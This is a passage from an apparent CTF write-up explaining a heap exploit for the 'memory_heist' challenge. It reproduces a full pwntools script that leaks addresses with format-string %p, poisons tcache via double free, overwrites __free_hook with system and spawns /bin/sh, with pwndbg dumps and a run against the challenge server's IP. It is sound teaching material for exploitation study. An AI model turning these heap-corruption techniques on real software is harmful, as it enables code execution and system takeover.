    <span class="n">sice</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>

    <span class="n">sice</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="c1"># tcache
</span>
    <span class="n">leaks</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="s">'a'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">))</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span> <span class="o">+</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">)[</span><span class="mi">8</span><span class="p">],</span><span class="mi">0</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2000</span>
    <span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span> <span class="o">+</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">)[</span><span class="mi">5</span><span class="p">],</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x11b0</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span> <span class="o">+</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">)[</span><span class="mi">15</span><span class="p">],</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Heap base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Pie leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'AA'</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'AA'</span><span class="p">)</span>

    <span class="n">sice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">sice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x508</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">))</span>

    <span class="n">sice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">sice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x508</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x4060</span><span class="p">))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">))</span>

    <span class="n">sice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x280</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\1</span><span class="s">'</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1eeb20</span><span class="p">))</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x55410</span><span class="p">))</span>
    <span class="n">sice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Lets walk through, step by step.</p>

<p>Firstly we have a set of helper functions:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># muh debugging
</span><span class="k">def</span> <span class="nf">attach_stop</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="nb">raw_input</span><span class="p">()</span>

<span class="c1"># allocate a chunk
</span><span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'Memory&gt; '</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="c1"># free a chunk
</span><span class="k">def</span> <span class="nf">sice</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="c1"># view a chunk - this also wipes out half of our `chunks` array
</span><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">kek</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[Y/N]&gt; '</span><span class="p">,</span><span class="n">kek</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</code></pre></div></div>

<p>These <em>primitives</em> are here to make it incredibly easy to perform operations on the heap of the target, we have one for each function: <code class="language-plaintext highlighter-rouge">alloc</code> for allocating chunks, <code class="language-plaintext highlighter-rouge">view</code> for printing chunk contents, and <code class="language-plaintext highlighter-rouge">sice</code>/<code class="language-plaintext highlighter-rouge">free</code> for <code class="language-plaintext highlighter-rouge">free()</code>ing chunks.</p>

<p>Its important to mention that due to the behavior of the <code class="language-plaintext highlighter-rouge">print()</code> function we cant use the <code class="language-plaintext highlighter-rouge">view</code> function more than once; since its already hard enough to exploit with the limited slots we have left from one call.</p>

<p>Firstly, we start the binary, and make 4 allocations:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x208</span><span class="p">,</span><span class="s">'AA'</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span><span class="s">'AA'</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">'AAAA'</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'</span><span class="p">)</span> <span class="c1"># leaky chunk
</span></code></pre></div></div>

<p>The first allocation exists only to box in allocation ‚Äò7‚Äô such that it will not be consumed - if you cant already tell, ‚Äò7‚Äô will be very important for our exploit to come. 7 is also an <code class="language-plaintext highlighter-rouge">unsorted</code> bin chunk when free‚Äôd, making it able to be re-used with other chunks (this fact is also very important).</p>

<p>We then make another allocation in ‚Äò9‚Äô which also functions as a ‚Äúbox‚Äù so that our chunk will not be consumed and another in ‚Äò11‚Äô.</p>

<h2 id="leaks">Leaks</h2>

<p>The chunk in ‚Äò11‚Äô will be passed to <code class="language-plaintext highlighter-rouge">printf</code> in <code class="language-plaintext highlighter-rouge">print()</code> and will leak us all the pointers we need from the stack for our exploit.</p>

<p>We can see this here:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sice</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>

<span class="n">sice</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="c1"># tcache
</span>
<span class="n">leaks</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="s">'a'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">))</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span> <span class="o">+</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">)[</span><span class="mi">8</span><span class="p">],</span><span class="mi">0</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2000</span>
<span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span> <span class="o">+</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">)[</span><span class="mi">5</span><span class="p">],</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x11b0</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span> <span class="o">+</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x'</span><span class="p">)[</span><span class="mi">15</span><span class="p">],</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Heap base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Pie leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<p>First we free idx‚Äôs 7 and 9, then we <code class="language-plaintext highlighter-rouge">view</code> the chunk 11‚Äôs contents and leak values from the stack, luckily we were able to leak out a heap, PIE, and libc address respectively. This is all the leaks we need.</p>

<p>However this has some undesirable side affects; half of our chunks have become unusable; specifically all odd indexes. This means that all chunks allocated/free‚Äôd prior to this have been cut loose; as we have no way to reference them:</p>

<p>Here is the <code class="language-plaintext highlighter-rouge">chunks</code> array:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x55d45f1ea060 &lt;chunks&gt;:        0x0000000000000000      0x0054696d616f6877
0x55d45f1ea070 &lt;chunks+16&gt;:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea080 &lt;chunks+32&gt;:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea090 &lt;chunks+48&gt;:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea0a0 &lt;chunks+64&gt;:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea0b0 &lt;chunks+80&gt;:     0x0000000000000000      0x0054696d616f6877
</code></pre></div></div>

<p>As you can see, where our allocations used to be is the string ‚ÄúwhoamIT‚Äù.</p>

<h2 id="feng-shui">Feng-Shui</h2>

<p>At this point in the program, our heap looks like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Allocated chunk | PREV_INUSE
Addr: 0x55d46019a000
Size: 0x291

Allocated chunk | PREV_INUSE &lt;-------- chunk 1
Addr: 0x55d46019a290
Size: 0x221

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55d46019a4b0 &lt;--------- chunk 7
Size: 0x2011
fd: 0x7f6c44c75be0
bk: 0x7f6c44c75be0

Free chunk (tcache)    &lt;------- chunk '9'
Addr: 0x55d46019c4c0
Size: 0x110
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x55d46019c5d0
Size: 0x111       &lt;------- chunk 11

Top chunk | PREV_INUSE
Addr: 0x55d46019c6e0
Size: 0x1e921

</code></pre></div></div>

<p>Here‚Äôs where hk pulls out the heap ninja skills.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'hk'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'hk'</span><span class="p">)</span>

<span class="n">sice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">sice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div></div>

<p>We allocate 2 chunks, then immediately free both of them again. This has a pretty cool effect: because chunk 7 (the unsorted-bin chunk) exists and is free, <code class="language-plaintext highlighter-rouge">malloc()</code> will split parts of that chunk off for allocations 0 and 2. This looks like this, afterward:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Allocated chunk | PREV_INUSE
Addr: 0x557b358bb4b0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x557b358bb9c0
Size: 0x511

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x557b358bbed0
Size: 0x15f1
fd: 0x7effd671dbe0
bk: 0x7effd671dbe0

</code></pre></div></div>

<p>Notice the size of the <code class="language-plaintext highlighter-rouge">unsorted</code> chunk. Some math will show you that:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0x2010</span> <span class="o">-</span> <span class="mh">0x510</span> <span class="o">-</span> <span class="mh">0x510</span><span class="p">)</span>
<span class="s">'0x15f0'</span>
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>

<p>This chunk has, in fact had pieces torn off and used for allocations 0 and 2. Specifically notice the last 3 nibbles of the original chunk 7, when compared with the first new allocation. Do you see it ;).</p>

<p>Now when these chunks are free‚Äôd again, they are handed back to the <code class="language-plaintext highlighter-rouge">unsorted</code> chunk again:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Allocated chunk | PREV_INUSE
Addr: 0x558e41484000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x558e41484290
Size: 0x221

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x558e414844b0
Size: 0x2011
fd: 0x7fce8c28cbe0
bk: 0x7fce8c28cbe0

Free chunk (tcache)
Addr: 0x558e414864c0
Size: 0x110
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x558e414865d0
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x558e414866e0
Size: 0x1e921
</code></pre></div></div>

<p>This may look exactly the same as the snapshot of the heap before, however there is one difference. Despite being free‚Äôd, we still have references to chunks 0, and 2 in our <code class="language-plaintext highlighter-rouge">chunks</code> array:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x558e409ab060 &lt;chunks&gt;:        0x0000558e414844c0      0x0054696d616f6877
0x558e409ab070 &lt;chunks+16&gt;:     0x0000558e414849d0      0x0054696d616f6877
0x558e409ab080 &lt;chunks+32&gt;:     0x0000000000000000      0x0054696d616f6877
0x558e409ab090 &lt;chunks+48&gt;:     0x0000000000000000      0x0054696d616f6877
0x558e409ab0a0 &lt;chunks+64&gt;:     0x0000000000000000      0x0054696d616f6877
0x558e409ab0b0 &lt;chunks+80&gt;:     0x0000000000000000      0x0054696d616f6877
</code></pre></div></div>

<p>0 points the start of chunk 7, where it was chopped off from. And 2 points 0x500 bytes into the bigger chunk. What does this mean? Well this wouldn‚Äôt normally be a problem, but since we have the ability to double-free any chunk we like, if chunk 2 LOOKED like an authentic chunk we could <code class="language-plaintext highlighter-rouge">free()</code> it again.</p>

<p>Since 2 points into the user-portion of the free <code class="language-plaintext highlighter-rouge">unsorted</code> chunk, if someone was to request an allocation with the size of the chunk, and then fill it with fake metadata at offset 0x500, you could make allocation 2 LOOK authentic.</p>

<p>This is exactly what we do next:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x508</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">))</span>

<span class="n">sice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">sice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We request an allocation that can be fulfilled by our free <code class="language-plaintext highlighter-rouge">unsorted</code> chunk, then we fill it up to 0x508 bytes deep with garbage. Then we provide a fake <code class="language-plaintext highlighter-rouge">size</code> of 0x111. This is enough to convince <code class="language-plaintext highlighter-rouge">free</code> that our chunk is valid, you can thank tcache for that :).</p>

<p>Now when we <code class="language-plaintext highlighter-rouge">free</code> 2, a chunk will be added to the tcache. Since 0 holds a pointer to the start of the <code class="language-plaintext highlighter-rouge">unsorted</code> chunk we can use that to <code class="language-plaintext highlighter-rouge">free</code> it again for further use.</p>

<p>After this point, our heap looks extremely familiar:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Allocated chunk | PREV_INUSE
Addr: 0x55dc4f720000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x55dc4f720290
Size: 0x221

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55dc4f7204b0
Size: 0x2011
fd: 0x7f6849936be0
bk: 0x7f6849936be0

Free chunk (tcache)
Addr: 0x55dc4f7224c0
Size: 0x110
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x55dc4f7225d0
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x55dc4f7226e0
Size: 0x1e921
</code></pre></div></div>

<p>But in the tcache, on the top of the 0x110 bin is a chunk whos backing memory we completely control from the <code class="language-plaintext highlighter-rouge">unsorted</code> chunk:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcachebins
0x110 [  2]: 0x55dc4f7209d0 ‚Äî‚ñ∏ 0x55dc4f7224d0 ‚óÇ‚Äî 0x0
</code></pre></div></div>

<p>The key here is that, because earlier we added chunk 9 to the tcache we now have 2 chunks on the bin, which means that if one of them happens to be consumed, the <code class="language-plaintext highlighter-rouge">next</code> ptr of that chunk will be trusted to contain a real chunk pointer, and this <code class="language-plaintext highlighter-rouge">next</code> is completely under our control.</p>

<p>Did you get all of that?</p>

<h2 id="gloating">Gloating</h2>

<p>Its not too far now‚Ä¶</p>

<p>Now, we overwrite the <code class="language-plaintext highlighter-rouge">next</code> member of our tcache chunk ‚Äò2‚Äô:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x508</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x4060</span><span class="p">))</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">)</span>
</code></pre></div></div>

<p>Specifically, we overwrite it with the <code class="language-plaintext highlighter-rouge">chunks</code> array we also overwrite the <code class="language-plaintext highlighter-rouge">free_hook</code> copy so the check that verifies whether or not <code class="language-plaintext highlighter-rouge">__free_hook</code> has been overwritten checks a null pointer, and still believes everything is okay. This allows us to call <code class="language-plaintext highlighter-rouge">delete</code> after we overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code>, and subsequently call <code class="language-plaintext highlighter-rouge">free()</code>.</p>

<p>Now once we consume another entry from the tcache we can see this corruption in action:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcachebins
0x110 [  1]: 0x55d4de18f060 (chunks) ‚Äî‚ñ∏ 0x55d4e00e44c0 ‚óÇ‚Äî ...
</code></pre></div></div>

<p>The next element consumed from the tcache will now hand out an allocation that points into the <code class="language-plaintext highlighter-rouge">chunks</code> array:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">alloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">))</span>
</code></pre></div></div>

<p>This overwrites the entire <code class="language-plaintext highlighter-rouge">chunks</code> array:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                           V idx '0' now points to the first chunk on the heap - this is where the tcache
                                             `tcache_perthread_struct` struct is stored.
    0x5577491b2060 &lt;chunks&gt;:        0x000055774ad5b010      0x0000000000000000
    0x5577491b2070 &lt;chunks+16&gt;:     0x0000000000000000      0x0000000000000000
    0x5577491b2080 &lt;chunks+32&gt;:     0x0000000000000000      0x0000000000000000
    0x5577491b2090 &lt;chunks+48&gt;:     0x0000000000000000      0x0000000000000000
    0x5577491b20a0 &lt;chunks+64&gt;:     0x0000000000000000      0x0000000000000000
    0x5577491b20b0 &lt;chunks+80&gt;:     0x0000000000000000      0x0000000000000000
    0x5577491b20c0 &lt;free_hook&gt;:     0x000055774ad5b400 &lt;------ we also overwrite a copy of the __free_hook.
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">idx</code> 0 now contains the allocation at the start of the heap that contains the <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code>. This is responsible for keeping all bins, and a count of how many chunks remain in each bin.</p>

<p>Another thing this overwrites is a copy of the <code class="language-plaintext highlighter-rouge">__free_hook</code> that came just after our <code class="language-plaintext highlighter-rouge">chunks</code></p>

<p>Next, we <code class="language-plaintext highlighter-rouge">free</code> 0, this makes the <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> chunk available, and we promptly use it and overwrite its contents:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x280</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\1</span><span class="s">'</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1eeb20</span><span class="p">))</span>
</code></pre></div></div>
<p>We need to specify a size that is close to 0x290 - the size of the allocation to get it back, but once we do:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  counts = {257 &lt;repeats 64 times&gt;},
  entries = {0x7efd61112b20 &lt;__after_morecore_hook&gt;, 0x0 &lt;repeats 14 times&gt;, 0x5617bf9694c0, 0x0 &lt;repeats 48 times&gt;}
}
</code></pre></div></div>

<p>We overwrite every single entry inside our <code class="language-plaintext highlighter-rouge">counts</code> of our <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> such that each bin has one chunk inside it, and this enables us to remove the <code class="language-plaintext highlighter-rouge">__after_morecore_hook</code> allocation within libc from here.</p>

<p>Now, at <code class="language-plaintext highlighter-rouge">__after_morecore_hook+8</code> is a bit of a surprise:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/gx &amp;__after_morecore_hook
0x7efd61112b20 &lt;__after_morecore_hook&gt;: 0x0000000000000000
pwndbg&gt; x/gx 0x7efd61112b20+8
0x7efd61112b28 &lt;__free_hook&gt;:   0x0000000000000000
pwndbg&gt;
</code></pre></div></div>

<p>As you can see, from here we are able to overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> in libc, lets see how thats done:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x55410</span><span class="p">))</span>
<span class="c1"># Do it xPPPP
</span><span class="n">sice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>First, this will overwrite <code class="language-plaintext highlighter-rouge">__after_morecore_hook</code> with the string ‚Äú/bin/sh\0‚Äù which (luckily) is exactly 8 bytes. After that we overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> with the address of <code class="language-plaintext highlighter-rouge">__libc_system</code>.</p>

<p>Now when we call <code class="language-plaintext highlighter-rouge">sice(2)</code> we will call <code class="language-plaintext highlighter-rouge">system</code> with our chunk 2, and since chunk 2 points directly at <code class="language-plaintext highlighter-rouge">__after_morecore_hook</code>, we will call <code class="language-plaintext highlighter-rouge">system("/bin/sh\0");</code>.</p>

<p>Lets test:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nomu:~/D/I/memory_heist
‚ùØ‚ùØ python sol.py
[+] Opening connection to 35.244.10.136 on port 10253: Done
